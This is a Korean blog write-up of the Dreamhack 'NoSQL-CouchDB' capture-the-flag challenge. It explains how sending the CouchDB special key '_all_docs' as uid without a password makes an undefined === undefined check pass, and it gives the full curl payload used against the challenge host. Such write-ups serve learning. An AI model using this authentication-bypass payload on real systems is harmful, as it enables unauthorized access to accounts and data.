---
title: "[DREAMHACK] NoSQL-CouchDB writeup"
date: 2026-03-12 09:00:59
categories: Essay
tags: [writeup]
---

이 문제는 입문하기에 재밌었다고 생각한다.  
실제로 그랬으니까??  

익숙하지 않은 개념이라 드림핵 강의를 봤다.  
운이 좋아서 그런가, `uid`에 대한 특별한 검사가 없다는 말을 듣자마자 풀이가 떠올랐다.  

나.웹해커의힘을숨김.  
<!--more-->

`/view`에 있던 `index.ejs`를 보면 `uid`와 `upw`를 `form`으로 `/auth`로 만들어 **POST**한다.  

우리가 봐야할 부분은 일단 `/auth`다.  

```js
users.get(req.body.uid, function(err, result) {
    if (err) {
            ...
    }
}
```

그냥 유효한 거 넣고, 유효하지 않으면 오류 뽑으면서 종료하기.  
혹은 해당하는 키가 있으면 걔 `upw` 가져와서 아까 `form`에 넣은 애랑 비교하는듯.  

그 부분은  

```js
if (result.upw === req.body.upw) {
            res.send(`FLAG: ${process.env.FLAG}`);
} else {
            res.send('fail');
}
```

아까 코드 바로 밑에 달려있음.  

여기서 `===` 연산자로 보건대,  
이건 타입 뿐만 아니라 값도 같아야 함.  
그런데 나는 `blind sqli`도 제대로 다루지 못할 뿐더러..  
이건 `NoSQLi`인데???  

해서 바로 떠오른 방법이 `undefined` 타입을 이용하는 것이다.  
타입도 `undefined`, 값도 `undefined`니까 저 `js`에서의 비교 구문은 쉽게 통과할 수 있을 거다.  

사용한 페이로드는 다음과 같다:
```bash
curl -X POST http://host3.dreamhack.games:11944/auth -H 'Content-Type: application/json' -d '{"uid": "_all_docs"}'
```

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/2643bd1ca1976fec68088e44400a4b3a77f5ce0a1a5e63784e11b152edace577.png)

바로 획득함 ㅋ